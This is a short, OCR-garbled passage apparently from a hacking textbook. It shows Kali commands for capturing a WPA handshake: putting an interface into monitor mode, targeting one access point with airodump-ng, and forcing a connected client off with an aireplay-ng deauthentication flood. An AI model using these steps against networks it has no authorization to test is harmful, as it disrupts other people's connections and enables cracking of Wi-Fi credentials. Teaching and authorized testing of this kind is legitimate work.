```
kali > airo n-ng start wlan0
```

Then we start ai rodump-ng to collect information and packets.

```
kali > ai rodump-ng wlan 0 mon We will likely want to focus our packet capture on a single AP on a single channel. We can do that by entering: kali > ai rodump-ng -bssid <BSSID of the Target AP> -c <the channel the AP is transmitting on> --write <file name to save the hash> wlan 0 mon If you are impatient like me, you can bump off a client who is already connected to the AP, and then when they reconnect, you will capture their handshake using aireplay-ng such as: kali > aireplay-ng -deauth 100 -a AA:BB:CC:DD:EE:FF wlan 0 mon 264 | P a g e
```

![](bbox=[0.13, 0.44, 0.87, 0.65])

![](bbox=[0.13, 0.68, 0.87, 0.73])

![](bbox=[0.13, 0.76, 0.87, 0.82])

Where:

# aireplay-ng